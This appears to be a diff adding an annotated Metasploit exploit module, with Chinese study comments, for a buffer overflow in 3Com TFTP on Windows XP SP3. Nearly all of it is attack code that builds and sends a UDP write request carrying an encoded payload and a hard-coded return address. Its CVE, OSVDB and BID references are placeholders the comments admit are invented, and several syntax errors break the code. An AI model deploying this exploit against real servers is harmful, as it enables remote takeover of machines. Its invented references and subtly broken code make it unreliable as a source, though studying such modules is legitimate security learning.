@@ -1,0 +1,81 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+#声明该模块使用的类型是泛型类、库或者模块中继承数据结构。
+class Metasploit3 < Msf::exploit::Remote
+    Rank = AverageRanking
+#该模块是通过UDP数据包远程实施网络攻击的模块，攻击类型是SEH覆盖
+    include Msf::Exploit::Remote::Udp
+#   这个就不需要了，因为exp通过覆盖返回地址攻击，调用UDP就可以了
+#    include Msf::Exploit::Remote::She
+def initialize(info = ())
+    super(update_info(info,
+        'Name'            => '3com TFTP long Mode Buffer Overflow',
+        'Description'    =>  %q{
+                这个攻击模块呢，是3com TFTP ，版本是2.0.2.(假设是这样的，如果自己发现了的话就好了。。)
+        },
+#作者信息
+        'Author'         => 'ENOMOTHEM',
+        'References'          =>
+                [
+#漏洞编号信息，我们假设一个编号，在是更大平台的编号，以数组形式列举。
+                        ['CVE','2019-0606'],
+                        ['OSVDB','66666'],
+                        ['BID','333333'],
+                        ['URL','http://www.security.org.sg/vuln/tftp2000-1001.html'],
+
+                ],
+              'DefaultOptions' =>
+               {
+                      'EXITFUNC' => 'process',
+                },
+              'Payload'          =>
+                {
+#声明了攻击字符串可分配给有效载荷使用的存储空间；
+                      'Space' =>473,
+#声明了需要规避的破坏性字符
+                      'BadChars'  =>  "\x00",
+#该字段指定了避免覆盖有效载荷而需要ESP移动的偏移量
+                      'StackAdjustment' => -3500,
+                },
+              'Platform'          => 'win',
+              'Targets'            =>
+                 [
+#列出所有操作系统和相关返回地址,该漏洞只适用于此系统的这个版本。
+                    ['windows XP Pro SP3 English ', {'Ret' => 0x7E45AE4E} ], #JMP ESI USER32.dll
+#                      ['windows 2000 Pro English ALL', {'Ret' => 0x75022ac4} ], #ws2help.dll
+#                      ['windows XP Pro SP0/SP1 English',{'Ret'=> 0x71aa32ad}], #ws2help.dll
+#                      ['windows NT SP5/SP6a English',{'Ret' =>0x776a1799}], #ws2help.dll
+#                      ['windows 2003 Server English', {'Ret' => 0x7ffc0638}], # PEB return
+                 ],
+               'Privileged'                     => true,
+#默认情况下target为0
+               'DefaultTarget'                  =>0,
+               'DisclosureDate'                 => 'May 31 2005'))
+
+             register_options(
+                [
+#TFTP默认端口69
+                    Opt::RPORT(69)
+                ],     self.class)
+#Ruby语言块end结尾
+        end
+        def  exploit
+#调用UDP全套字的方法
+             connect_udp
+
+              print_status("Trying target #(target.name)...")
+#告诉TFTP服务器，即将传送一个文件，然后使用rand_text_english函数创建函数创建一个随机的6字符的文件夹名，最后是使用空字符作为文件名的结束符。
+              sploit  = "\x00\x02"  +  rand_text_english(6, payload_badchars) +  "\x00"
+#用户所选的有效载荷和返回地址，之外还要加上空字符
+              sploit  +=  payload.encode + [target.ret].pack('V')+"\00"
+#定义此方法将字符串发送到目标服务器
+              udp_sock.put(sploit)
+
+              handler
+              disconnect_udp
+          end
+end
